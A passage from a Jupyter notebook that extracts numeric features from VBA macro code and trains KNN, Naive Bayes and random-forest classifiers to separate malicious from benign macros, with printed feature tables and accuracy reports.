       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31883</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31884</th>\n",
       "      <td>1</td>\n",
       "      <td>12274</td>\n",
       "      <td>402</td>\n",
       "      <td>30.532338</td>\n",
       "      <td>23</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.003748</td>\n",
       "      <td>1</td>\n",
       "      <td>0.007414</td>\n",
       "      <td>0.000244</td>\n",
       "      <td>0.003340</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31885</th>\n",
       "      <td>1</td>\n",
       "      <td>1000</td>\n",
       "      <td>42</td>\n",
       "      <td>23.809524</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.006000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31886</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31887</th>\n",
       "      <td>0</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>31888 rows × 13 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       label  code_length  num_lines  avg_chars_per_line  num_loops  \\\n",
       "0          1         1070         34           31.470588          0   \n",
       "1          1        13092        420           31.171429         23   \n",
       "2          0         3428         86           39.860465          1   \n",
       "3          0         3428         86           39.860465          1   \n",
       "4          0         3428         86           39.860465          1   \n",
       "...      ...          ...        ...                 ...        ...   \n",
       "31883      0         3428         86           39.860465          1   \n",
       "31884      1        12274        402           30.532338         23   \n",
       "31885      1         1000         42           23.809524          0   \n",
       "31886      0         3428         86           39.860465          1   \n",
       "31887      0         3428         86           39.860465          1   \n",
       "\n",
       "       has_error_handling  has_url_or_ip  is_obfuscated  num_string_literals  \\\n",
       "0                       0              0              0             0.005607   \n",
       "1                       1              0              0             0.006416   \n",
       "2                       0              1              1             0.008460   \n",
       "3                       0              1              1             0.008460   \n",
       "4                       0              1              1             0.008460   \n",
       "...                   ...            ...            ...                  ...   \n",
       "31883                   0              1              1             0.008460   \n",
       "31884                   1              0              0             0.003748   \n",
       "31885                   1              0              0             0.000000   \n",
       "31886                   0              1              1             0.008460   \n",
       "31887                   0              1              1             0.008460   \n",
       "\n",
       "       has_information_disclosure  num_numeric_literals  \\\n",
       "0                               1              0.001869   \n",
       "1                               1              0.008631   \n",
       "2                               1              0.019253   \n",
       "3                               1              0.019253   \n",
       "4                               1              0.019253   \n",
       "...                           ...                   ...   \n",
       "31883                           1              0.019253   \n",
       "31884                           1              0.007414   \n",
       "31885                           0              0.000000   \n",
       "31886                           1              0.019253   \n",
       "31887                           1              0.019253   \n",
       "\n",
       "       num_exclamation_marks  num_functions  \n",
       "0                   0.000000       0.003738  \n",
       "1                   0.000229       0.002215  \n",
       "2                   0.002042       0.002334  \n",
       "3                   0.002042       0.002334  \n",
       "4                   0.002042       0.002334  \n",
       "...                      ...            ...  \n",
       "31883               0.002042       0.002334  \n",
       "31884               0.000244       0.003340  \n",
       "31885               0.000000       0.006000  \n",
       "31886               0.002042       0.002334  \n",
       "31887               0.002042       0.002334  \n",
       "\n",
       "[31888 rows x 13 columns]"
      ]
     },
     "execution_count": 77,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "coloumns = ['label', 'code_length', 'num_lines', 'avg_chars_per_line', 'num_loops',\n",
    "        'has_error_handling', 'has_url_or_ip', 'is_obfuscated', 'num_string_literals',\n",
    "        'has_information_disclosure', 'num_numeric_literals', 'num_exclamation_marks',\n",
    "        'num_functions']\n",
    "train = train_df[coloumns]\n",
    "train"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "id": "32f1e665",
   "metadata": {},
   "outputs": [],
   "source": [
    "def set_data(df):\n",
    "    df['code_length'] = df['vba_code'].apply(len)\n",
    "    df['num_lines'] = df['vba_code'].apply(lambda x: x.count('\\n') + 1)\n",
    "    df['avg_chars_per_line'] = df.apply(lambda row: row['code_length'] / row['num_lines'] if row['num_lines'] > 0 else 0, axis=1)\n",
    "    df['num_loops'] = df['vba_code'].apply(lambda x: x.count('For') + x.count('While'))\n",
    "    df['has_error_handling'] = df['vba_code'].apply(lambda x: 1 if 'On Error' in x else 0)\n",
    "    df['has_url_or_ip'] = df['vba_code'].apply(has_url_or_ip)\n",
    "    df['is_obfuscated'] = df['vba_code'].apply(is_obfuscated)\n",
    "    df['num_string_literals'] = df.apply(lambda row: len(re.findall(r'\"([^\"]*)\"', row['vba_code'])) / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "    df['has_information_disclosure'] = df['vba_code'].apply(has_information_disclosure)\n",
    "    df['num_numeric_literals'] = df.apply(lambda row: len(re.findall(r'\\b\\d+\\b', row['vba_code'])) / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "    df['num_exclamation_marks'] = df.apply(lambda row: row['vba_code'].count('!') / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "    df['num_functions'] = df.apply(lambda row: (row['vba_code'].count('Sub ') + row['vba_code'].count('Function ')) / row['code_length'] if row['code_length'] > 0 else 0, axis=1)\n",
    "    \n",
    "    df = df.drop('vba_code', axis=1)\n",
    "    return df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "id": "d786e733",
   "metadata": {},
   "outputs": [],
   "source": [
    "validation = set_data(validation_df)\n",
    "test = set_data(test_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "7387fac3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>label</th>\n",
       "      <th>code_length</th>\n",
       "      <th>num_lines</th>\n",
       "      <th>avg_chars_per_line</th>\n",
       "      <th>num_loops</th>\n",
       "      <th>has_error_handling</th>\n",
       "      <th>has_url_or_ip</th>\n",
       "      <th>is_obfuscated</th>\n",
       "      <th>num_string_literals</th>\n",
       "      <th>has_information_disclosure</th>\n",
       "      <th>num_numeric_literals</th>\n",
       "      <th>num_exclamation_marks</th>\n",
       "      <th>num_functions</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>mal</td>\n",
       "      <td>1425</td>\n",
       "      <td>48</td>\n",
       "      <td>29.687500</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1</td>\n",
       "      <td>0.007719</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.001404</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>mal</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>white</td>\n",
       "      <td>393</td>\n",
       "      <td>28</td>\n",
       "      <td>14.035714</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.002545</td>\n",
       "      <td>0</td>\n",
       "      <td>0.007634</td>\n",
       "      <td>0.002545</td>\n",
       "      <td>0.020356</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>white</td>\n",
       "      <td>726</td>\n",
       "      <td>23</td>\n",
       "      <td>31.565217</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.011019</td>\n",
       "      <td>0</td>\n",
       "      <td>0.004132</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.004132</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>mal</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10624</th>\n",
       "      <td>mal</td>\n",
       "      <td>1000</td>\n",
       "      <td>26</td>\n",
       "      <td>38.461538</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0.011000</td>\n",
       "      <td>1</td>\n",
       "      <td>0.004000</td>\n",
       "      <td>0.001000</td>\n",
       "      <td>0.002000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10625</th>\n",
       "      <td>white</td>\n",
       "      <td>5924</td>\n",
       "      <td>250</td>\n",
       "      <td>23.696000</td>\n",
       "      <td>13</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0.006077</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019750</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.001519</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10626</th>\n",
       "      <td>white</td>\n",
       "      <td>11879</td>\n",
       "      <td>505</td>\n",
       "      <td>23.522772</td>\n",
       "      <td>6</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.014143</td>\n",
       "      <td>1</td>\n",
       "      <td>0.017594</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.004630</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10627</th>\n",
       "      <td>mal</td>\n",
       "      <td>3428</td>\n",
       "      <td>86</td>\n",
       "      <td>39.860465</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0.008460</td>\n",
       "      <td>1</td>\n",
       "      <td>0.019253</td>\n",
       "      <td>0.002042</td>\n",
       "      <td>0.002334</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10628</th>\n",
       "      <td>white</td>\n",
       "      <td>388</td>\n",
       "      <td>16</td>\n",
       "      <td>24.250000</td>\n",
       "      <td>2</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.005155</td>\n",
       "      <td>0</td>\n",
       "      <td>0.005155</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.005155</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>10629 rows × 13 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       label  code_length  num_lines  avg_chars_per_line  num_loops  \\\n",
       "0        mal         1425         48           29.687500          0   \n",
       "1        mal         3428         86           39.860465          1   \n",
       "2      white          393         28           14.035714          0   \n",
       "3      white          726         23           31.565217          1   \n",
       "4        mal         3428         86           39.860465          1   \n",
       "...      ...          ...        ...                 ...        ...   \n",
       "10624    mal         1000         26           38.461538          1   \n",
       "10625  white         5924        250           23.696000         13   \n",
       "10626  white        11879        505           23.522772          6   \n",
       "10627    mal         3428         86           39.860465          1   \n",
       "10628  white          388         16           24.250000          2   \n",
       "\n",
       "       has_error_handling  has_url_or_ip  is_obfuscated  num_string_literals  \\\n",
       "0                       1              0              0             0.000000   \n",
       "1                       0              1              1             0.008460   \n",
       "2                       0              0              0             0.002545   \n",
       "3                       0              0              0             0.011019   \n",
       "4                       0              1              1             0.008460   \n",
       "...                   ...            ...            ...                  ...   \n",
       "10624                   1              0              1             0.011000   \n",
       "10625                   0              0              1             0.006077   \n",
       "10626                   0              0              0             0.014143   \n",
       "10627                   0              1              1             0.008460   \n",
       "10628                   0              0              0             0.005155   \n",
       "\n",
       "       has_information_disclosure  num_numeric_literals  \\\n",
       "0                               1              0.007719   \n",
       "1                               1              0.019253   \n",
       "2                               0              0.007634   \n",
       "3                               0              0.004132   \n",
       "4                               1              0.019253   \n",
       "...                           ...                   ...   \n",
       "10624                           1              0.004000   \n",
       "10625                           1              0.019750   \n",
       "10626                           1              0.017594   \n",
       "10627                           1              0.019253   \n",
       "10628                           0              0.005155   \n",
       "\n",
       "       num_exclamation_marks  num_functions  \n",
       "0                   0.000000       0.001404  \n",
       "1                   0.002042       0.002334  \n",
       "2                   0.002545       0.020356  \n",
       "3                   0.000000       0.004132  \n",
       "4                   0.002042       0.002334  \n",
       "...                      ...            ...  \n",
       "10624               0.001000       0.002000  \n",
       "10625               0.000000       0.001519  \n",
       "10626               0.000000       0.004630  \n",
       "10627               0.002042       0.002334  \n",
       "10628               0.000000       0.005155  \n",
       "\n",
       "[10629 rows x 13 columns]"
      ]
     },
     "execution_count": 80,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "validation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "id": "8b355fe7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>code_length</th>\n",
       "      <th>num_lines</th>\n",
       "      <th>avg_chars_per_line</th>\n",
       "      <th>num_loops</th>\n",
       "      <th>has_error_handling</th>\n",
       "      <th>has_url_or_ip</th>\n",
       "      <th>is_obfuscated</th>\n",
       "      <th>num_string_literals</th>\n",
       "      <th>has_information_disclosure</th>\n",
       "      <th>num_numeric_literals</th>\n",
       "      <th>num_exclamation_marks</th>\n",
       "      <th>num_functions</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6190</td>\n",
       "      <td>237</td>\n",
       "      <td>26.118143</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.016963</td>\n",
       "      <td>0</td>\n",
       "      <td>0.009047</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.003231</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2997</td>\n",
       "      <td>90</td>\n",
       "      <td>33.300000</td>\n",
       "      <td>5</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.007007</td>\n",
       "      <td>1</td>\n",
       "      <td>0.001001</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.004004</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>718</td>\n",
       "      <td>20</td>\n",
       "      <td>35.900000</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.002786</td>\n",
       "      <td>1</td>\n",
       "      <td>0.015320</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.001393</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>6182</td>\n",
       "      <td>229</td>\n",
       "      <td>26.995633</td>\n",
       "      <td>5</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.014882</td>\n",
       "      <td>0</td>\n",
       "      <td>0.004368</td>\n",
       "      <td>0.001779</td>\n",
       "      <td>0.002103</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>2690</td>\n",
       "      <td>97</td>\n",
       "      <td>27.731959</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.001859</td>\n",
       "      <td>1</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.005204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10625</th>\n",
       "      <td>351</td>\n",
       "      <td>8</td>\n",
       "      <td>43.875000</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.002849</td>\n",
       "      <td>0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.002849</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10626</th>\n",
       "      <td>652</td>\n",
       "      <td>34</td>\n",
       "      <td>19.176471</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0.006135</td>\n",
       "      <td>1</td>\n",
       "      <td>0.003067</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.004601</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10627</th>\n",
       "      <td>1000</td>\n",
       "      <td>37</td>\n",
       "      <td>27.027027</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.008000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.004000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.003000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10628</th>\n",
       "      <td>1000</td>\n",
       "      <td>14</td>\n",
       "      <td>71.428571</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0.013000</td>\n",
       "      <td>0</td>\n",
       "      <td>0.011000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10629</th>\n",
       "      <td>4000</td>\n",
       "      <td>120</td>\n",
       "      <td>33.333333</td>\n",
       "      <td>13</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0.010750</td>\n",
       "      <td>1</td>\n",
       "      <td>0.005500</td>\n",
       "      <td>0.000250</td>\n",
       "      <td>0.001500</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>10630 rows × 12 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       code_length  num_lines  avg_chars_per_line  num_loops  \\\n",
       "0             6190        237           26.118143          0   \n",
       "1             2997         90           33.300000          5   \n",
       "2              718         20           35.900000          0   \n",
       "3             6182        229           26.995633          5   \n",
       "4             2690         97           27.731959          0   \n",
       "...            ...        ...                 ...        ...   \n",
       "10625          351          8           43.875000          0   \n",
       "10626          652         34           19.176471          0   \n",
       "10627         1000         37           27.027027          0   \n",
       "10628         1000         14           71.428571          0   \n",
       "10629         4000        120           33.333333         13   \n",
       "\n",
       "       has_error_handling  has_url_or_ip  is_obfuscated  num_string_literals  \\\n",
       "0                       0              0              0             0.016963   \n",
       "1                       0              0              0             0.007007   \n",
       "2                       1              0              0             0.002786   \n",
       "3                       0              0              0             0.014882   \n",
       "4                       0              0              0             0.001859   \n",
       "...                   ...            ...            ...                  ...   \n",
       "10625                   0              0              0             0.002849   \n",
       "10626                   0              1              0             0.006135   \n",
       "10627                   0              0              0             0.008000   \n",
       "10628                   0              0              0             0.013000   \n",
       "10629                   0              0              1             0.010750   \n",
       "\n",
       "       has_information_disclosure  num_numeric_literals  \\\n",
       "0                               0              0.009047   \n",
       "1                               1              0.001001   \n",
       "2                               1              0.015320   \n",
       "3                               0              0.004368   \n",
       "4                               1              0.000000   \n",
       "...                           ...                   ...   \n",
       "10625                           0              0.000000   \n",
       "10626                           1              0.003067   \n",
       "10627                           0              0.004000   \n",
       "10628                           0              0.011000   \n",
       "10629                           1              0.005500   \n",
       "\n",
       "       num_exclamation_marks  num_functions  \n",
       "0                   0.000000       0.003231  \n",
       "1                   0.000000       0.004004  \n",
       "2                   0.000000       0.001393  \n",
       "3                   0.001779       0.002103  \n",
       "4                   0.000000       0.005204  \n",
       "...                      ...            ...  \n",
       "10625               0.000000       0.002849  \n",
       "10626               0.000000       0.004601  \n",
       "10627               0.000000       0.003000  \n",
       "10628               0.000000       0.000000  \n",
       "10629               0.000250       0.001500  \n",
       "\n",
       "[10630 rows x 12 columns]"
      ]
     },
     "execution_count": 81,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "test"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bb5f61e9",
   "metadata": {},
   "source": [
    "# Training (Models)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "id": "d881db12",
   "metadata": {},
   "outputs": [],
   "source": [
    "from sklearn.neighbors import  KNeighborsClassifier\n",
    "from sklearn.model_selection import cross_val_score\n",
    "from sklearn.metrics import confusion_matrix\n",
    "from sklearn import metrics\n",
    "from sklearn.metrics import accuracy_score\n",
    "from sklearn.metrics import  roc_curve\n",
    "from sklearn.metrics import roc_auc_score"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "c6949d35",
   "metadata": {},
   "outputs": [],
   "source": [
    "# white = 1, mal = 0\n",
    "validation['label'] = validation['label'].replace('white',1, regex=True) \n",
    "validation['label'] = validation['label'].replace('mal',0, regex=True) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "id": "18dcfa35",
   "metadata": {},
   "outputs": [],
   "source": [
    "# split\n",
    "X_train = train.drop('label', axis=1)\n",
    "y_train = train['label']\n",
    "\n",
    "X_val = validation.drop('label', axis=1)\n",
    "y_val = validation['label']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "id": "30563b74",
   "metadata": {},
   "outputs": [],
   "source": [
    "vectorizer = TfidfVectorizer(ngram_range=(1, 2))\n",
    "X_train_tfidf = vectorizer.fit_transform(X_train)\n",
    "X_val_tfidf = vectorizer.transform(X_val)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17598c80",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "84a8126e",
   "metadata": {},
   "source": [
    "### KNN"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "id": "6bbbee0d",
   "metadata": {},
   "outputs": [],
   "source": [
    "knn = KNeighborsClassifier(n_neighbors=3)\n",
    "knn.fit(X_train, y_train)\n",
    "knn_pred = knn.predict(X_val)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "id": "855e0930",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9602032176121931"
      ]
     },
     "execution_count": 103,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "metrics.accuracy_score(y_val, knn_pred)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "id": "eb248f9d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.96      0.96      0.96      5320\n",
      "           1       0.96      0.96      0.96      5309\n",
      "\n",
      "    accuracy                           0.96     10629\n",
      "   macro avg       0.96      0.96      0.96     10629\n",
      "weighted avg       0.96      0.96      0.96     10629\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from sklearn.metrics import classification_report\n",
    "report = classification_report(y_val, knn_pred)\n",
    "print(report)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "id": "542f179c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Axes: >"
      ]
     },
     "execution_count": 105,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 800x600 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "con_mat = confusion_matrix(y_val, knn_pred)\n",
    "f, ax = plt.subplots(figsize=(6, 4))\n",
    "sns.heatmap(con_mat, annot=True, fmt='g',cmap=\"YlGnBu\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "id": "3d0bf09b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "fpr, tpr, _= roc_curve(y_val, knn_pred)\n",
    "auc= roc_auc_score(y_val, knn_pred)\n",
    "plt.plot(fpr, tpr, label=\"auc=\"+str(auc))\n",
    "plt.box(False)\n",
    "plt.xlim([0.0, 1.0])\n",
    "plt.ylim([0.0, 1.05])\n",
    "plt.xlabel('False Positive Rate')\n",
    "plt.ylabel('True Positive Rate')\n",
    "plt.grid(True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d6157e9b",
   "metadata": {},
   "source": [
    "### Gaussian Naive Bayes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "id": "077ae84d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.8706369366826606\n"
     ]
    }
   ],
   "source": [
    "from sklearn.naive_bayes import GaussianNB\n",
    "gnb = GaussianNB()\n",
    "gnb.fit(X_train, y_train)\n",
    "gnb_pred = gnb.predict(X_val)\n",
    "print(metrics.accuracy_score(y_val, gnb_pred))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "id": "21cdcb20",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.87      0.88      0.87      5320\n",
      "           1       0.87      0.87      0.87      5309\n",
      "\n",
      "    accuracy                           0.87     10629\n",
      "   macro avg       0.87      0.87      0.87     10629\n",
      "weighted avg       0.87      0.87      0.87     10629\n",
      "\n"
     ]
    }
   ],
   "source": [
    "report = classification_report(y_val, gnb_pred)\n",
    "print(report)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "17deb45c",
   "metadata": {},
   "source": [
    "### Random Forest Classification"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "id": "8287f265",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.9906858594411516\n"
     ]
    }
   ],
   "source": [
